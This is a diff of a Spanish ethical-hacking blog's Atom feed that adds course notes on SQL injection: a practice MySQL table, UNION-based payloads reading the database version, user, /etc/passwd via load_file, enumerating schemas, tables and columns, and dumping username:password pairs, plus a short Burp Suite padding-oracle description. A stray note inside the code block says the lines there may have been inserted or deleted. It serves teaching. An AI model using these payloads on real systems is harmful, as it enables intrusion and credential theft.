@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-12-24T19:20:29-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Ciberseguridad y Hacking Ético</title><subtitle>Artículos y Apuntes sobre ciberseguridad</subtitle><author><name>ARgoN</name></author><entry><title type="html">Apuntes del curso Introducción al hacking</title><link href="http://localhost:4000/Apuntes-introducci%C3%B3n-al-hacking/" rel="alternate" type="text/html" title="Apuntes del curso Introducción al hacking" /><published>2021-10-11T00:00:00-05:00</published><updated>2021-10-11T00:00:00-05:00</updated><id>http://localhost:4000/Apuntes-introducci%C3%B3n-al-hacking</id><content type="html" xml:base="http://localhost:4000/Apuntes-introducci%C3%B3n-al-hacking/">&lt;h1 id=&quot;conceptos-básicos&quot;&gt;Conceptos básicos&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-12-28T17:23:03-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Ciberseguridad y Hacking Ético</title><subtitle>Artículos y Apuntes sobre ciberseguridad</subtitle><author><name>ARgoN</name></author><entry><title type="html">Apuntes del curso Introducción al hacking</title><link href="http://localhost:4000/Apuntes-introducci%C3%B3n-al-hacking/" rel="alternate" type="text/html" title="Apuntes del curso Introducción al hacking" /><published>2021-10-11T00:00:00-05:00</published><updated>2021-10-11T00:00:00-05:00</updated><id>http://localhost:4000/Apuntes-introducci%C3%B3n-al-hacking</id><content type="html" xml:base="http://localhost:4000/Apuntes-introducci%C3%B3n-al-hacking/">&lt;h1 id=&quot;conceptos-básicos&quot;&gt;Conceptos básicos&lt;/h1&gt;
 &lt;h2 id=&quot;asignación-e-interpretación-de-permisos&quot;&gt;Asignación e Interpretación de permisos&lt;/h2&gt;
 
 &lt;p&gt;Para interpretar permisos podemos verlos con el comando &lt;strong&gt;ls -l&lt;/strong&gt; el cual nos muestra los permisos que tienen las carpetas o 
@@ -390,7 +390,65 @@ servidor al que se fuerza la conexión.&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;&lt;em&gt;Manera manual&lt;/em&gt;&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>ARgoN</name></author><category term="Pentesting" /><category term="Herramientas" /><category term="Windows" /><category term="Linux" /><category term="Domain Controller" /><category term="Guías" /><category term="Privilege Escalation" /><summary type="html">En este post están los apuntes que considero importante, también algunos recordatorios</summary></entry><entry><title type="html">Herramientas de Hacking</title><link href="http://localhost:4000/Herramientas-de-Hacking/" rel="alternate" type="text/html" title="Herramientas de Hacking" /><published>2020-01-30T00:00:00-05:00</published><updated>2020-01-30T00:00:00-05:00</updated><id>http://localhost:4000/Herramientas-de-Hacking</id><content type="html" xml:base="http://localhost:4000/Herramientas-de-Hacking/">&lt;h3 id=&quot;herramientas-de-hacking-y-pentesting&quot;&gt;Herramientas de hacking y pentesting&lt;/h3&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Para entender como funciona la vulnerabilidad debemos intentarlo por nuestra cuenta, primero nos creamos una base de datos
+para jugar&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;service mysql start
+mysql &lt;span class=&quot;nt&quot;&gt;-uroot&lt;/span&gt;
+create table Tabla1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;int&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, username varchar&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;32&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, password&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;32&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+??? desde aquí hasta ???FIN las líneas pueden haber sido insertadas/borradas
+insert into Tabla1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;, username, password&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; values &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1, &lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from Tabla1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from Tabla1 where &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#Selecciona los datos con la id que pongas&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from Tabla1 where &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1 order by 100&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; -&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#Hace un ordenamiento de datos en base a la columna 100&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from Tabla1 where &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1 union &lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;1,2,3,4&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; -&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#Donde los numeros 1,2,3,4 pueden ser reemplazados por código&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from Tabla1 where &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1 union &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; @@version, database&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;, user&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;, load_file&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/etc/passwd'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;En el código anterior vemos distintos parametros&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;@@version&lt;/strong&gt; : Muestra la versión de la base de datos&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;database()&lt;/strong&gt; : Muestra la base de datos que se está usando&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;user()&lt;/strong&gt; : Nombra el usuario que usa la base de datos&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;load_file(‘’)&lt;/strong&gt; : Carga un archivo que se coloque en las comillas&lt;/p&gt;
+
+&lt;p&gt;Para listar la base de datos de manera alternativa podemos usar el siguiente código:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from Tabla1 where &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1 union &lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;1,schema_name,3,4 from information_schema.schemata
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para listar las tablas de una base de dato de manera alternativa usamos el siguiente código:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from Tabla1 where &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1 union &lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;1,table_name,3,4 from information_schema.tables where table_schema &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Table1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; -&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para listar las columnas el siguiente código:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from Tabla1 where &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 union &lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;1, column_name,3,4 from information_schema.columns where &lt;span class=&quot;nv&quot;&gt;table_schema&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Table1'&lt;/span&gt; and &lt;span class=&quot;nv&quot;&gt;table_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Nombre_de_la_tabla'&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para poder listar los datos que ya sabemos que la base de datos tiene podemos usar el siguiente código:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from Tabla1 where &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 union &lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;1, concat&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;username,0x3a,password&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,3,4 from Tabla1.&lt;span class=&quot;s1&quot;&gt;'Nombre_de_la_tabla'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;vulnerabilidad-padding-oracle-attack---padbuster&quot;&gt;Vulnerabilidad Padding Oracle Attack - Padbuster&lt;/h2&gt;
+
+&lt;p&gt;Esta vulnerabilidad no solo se aplica en las páginas web si no en cualquiera que utilice un algoritmo de cifrado de bloques de longitud variable (es decir que necesita usar relleno o padding) y son vulnerables.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.hackplayers.com/2018/10/explotar-padding-oracle-para-obtener-clave.html&quot;&gt;Explotar padding oracle para obtener claves de cifrado&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Padding Oracle Attack - BurpSuite Bit Flipper Attack&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Para este tipo de ataques utilizamos el burpsuit, mandamos el código fuente al intruder después cargamos un payload a la cookie y marcamos un ataque de tipo Bit Flipper y lo dejamos correr.&lt;/p&gt;
+
+&lt;p&gt;Con esta función automatiza el ataque y te envía la cookie correcta que buscas.&lt;/p&gt;</content><author><name>ARgoN</name></author><category term="Pentesting" /><category term="Herramientas" /><category term="Windows" /><category term="Linux" /><category term="Domain Controller" /><category term="Guías" /><category term="Privilege Escalation" /><summary type="html">En este post están los apuntes que considero importante, también algunos recordatorios</summary></entry><entry><title type="html">Herramientas de Hacking</title><link href="http://localhost:4000/Herramientas-de-Hacking/" rel="alternate" type="text/html" title="Herramientas de Hacking" /><published>2020-01-30T00:00:00-05:00</published><updated>2020-01-30T00:00:00-05:00</updated><id>http://localhost:4000/Herramientas-de-Hacking</id><content type="html" xml:base="http://localhost:4000/Herramientas-de-Hacking/">&lt;h3 id=&quot;herramientas-de-hacking-y-pentesting&quot;&gt;Herramientas de hacking y pentesting&lt;/h3&gt;
 &lt;p&gt;Esta sección es una recopilación de herramientas que nos pueden ser útliles pero recomiendo ver 
 el código fuente e intentar recrearlo por nuestra cuenta:&lt;/p&gt;</content><author><name>ARgoN</name></author><category term="Burpsuite" /><category term="Bypassing" /><summary type="html">Esta sección es dedicada a programas y aplicaciones interesantes para el hacking</summary></entry><entry><title type="html">Apuntes Hack The Box</title><link href="http://localhost:4000/Apuntes-Hack-The-Box/" rel="alternate" type="text/html" title="Apuntes Hack The Box" /><published>2020-01-29T00:00:00-05:00</published><updated>2020-01-29T00:00:00-05:00</updated><id>http://localhost:4000/Apuntes-Hack-The-Box</id><content type="html" xml:base="http://localhost:4000/Apuntes-Hack-The-Box/">&lt;h3 id=&quot;apuntes-básicos&quot;&gt;Apuntes básicos:&lt;/h3&gt;
 
